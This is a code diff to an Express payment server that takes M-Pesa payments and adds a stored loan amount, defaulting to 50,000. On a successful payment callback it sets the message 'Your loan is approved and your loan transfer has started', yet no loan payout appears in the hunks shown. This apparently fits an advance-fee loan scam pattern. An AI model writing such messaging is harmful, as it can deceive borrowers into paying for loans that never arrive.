@@ -38,10 +38,10 @@ function formatPhone(phone) {
   return null;
 }
 
-// 1ï¸âƒ£ Initiate Payment
+// 1️⃣ Initiate Payment
 app.post("/pay", async (req, res) => {
   try {
-    const { phone, amount } = req.body;
+    const { phone, amount, loan_amount } = req.body;
     const formattedPhone = formatPhone(phone);
 
     if (!formattedPhone) {
@@ -77,13 +77,14 @@ app.post("/pay", async (req, res) => {
     console.log("SwiftWallet response:", resp.data);
 
     if (resp.data.success) {
-      // Save pending receipt
+      // Save pending receipt with loan amount
       let receipts = readReceipts();
       receipts[reference] = {
         reference,
         transaction_id: resp.data.transaction_id || null,
         transaction_code: null,
         amount: Math.round(amount),
+        loan_amount: loan_amount || '50000', // Store loan amount from request
         phone: formattedPhone,
         status: "pending",
         timestamp: new Date().toISOString()
@@ -109,7 +110,7 @@ app.post("/pay", async (req, res) => {
   }
 });
 
-// 2ï¸âƒ£ Callback handler
+// 2️⃣ Callback handler
 app.post("/callback", (req, res) => {
   console.log("Callback received:", req.body);
 
@@ -117,16 +118,23 @@ app.post("/callback", (req, res) => {
   const ref = data.external_reference;
 
   let receipts = readReceipts();
+  
+  // Get existing receipt to preserve loan_amount
+  const existingReceipt = receipts[ref] || {};
 
   receipts[ref] = {
-    reference: ref,
-    transaction_id: data.transaction_id,
-    transaction_code: data.result?.MpesaReceiptNumber || null,
-    amount: data.result?.Amount || null,
-    phone: data.result?.Phone || null,
-    status: data.status,
-    timestamp: data.timestamp
-  };
+  reference: ref,
+  transaction_id: data.transaction_id,
+  transaction_code: data.result?.MpesaReceiptNumber || null,
+  amount: data.result?.Amount || existingReceipt.amount || null,
+  loan_amount: existingReceipt.loan_amount || '50000', // Preserve loan amount
+  phone: data.result?.Phone || existingReceipt.phone || null,
+  status: data.status,
+  status_message: data.status === "success"
+      ? "Your loan is approved and your loan transfer has started"
+      : "Loan transfer failed",
+  timestamp: data.timestamp || new Date().toISOString()
+};
 
   writeReceipts(receipts);
 
@@ -134,7 +142,7 @@ app.post("/callback", (req, res) => {
   res.json({ ResultCode: 0, ResultDesc: "Success" });
 });
 
-// 3ï¸âƒ£ Fetch receipt endpoint
+// 3️⃣ Fetch receipt endpoint
 app.get("/receipt/:reference", (req, res) => {
   const receipts = readReceipts();
   const receipt = receipts[req.params.reference];
@@ -150,5 +158,5 @@ app.get("/receipt/:reference", (req, res) => {
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`ðŸš€ Server running on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
 });
